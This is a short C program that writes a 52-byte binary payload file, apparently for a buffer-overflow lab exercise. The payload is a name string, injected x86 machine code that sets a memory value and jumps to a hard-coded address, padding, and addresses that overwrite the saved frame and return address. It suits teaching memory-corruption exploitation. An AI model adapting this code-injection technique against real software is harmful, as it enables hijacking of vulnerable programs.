#include<stdio.h>

int main(){
	FILE *data;
	int i;
	char data_array[52]={'D','i','m','i','t','r','i','s',' ','T','s','o','l','i','s','\0','\xc6','\x05',
				'\xb4','\x85','\x08','\x08','\x39','\xb8','\xeb','\x02','\x05','\x08','\xff',
				'\xe0',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ','\x68',
				'\xb4','\x08','\x08','\x58','\xb4','\x08','\x08'};
	data=fopen("data9","w+");
	for(i=0;i<52;i++)
		fprintf(data,"%c",data_array[i]);
	fclose(data);
	return 0;
}
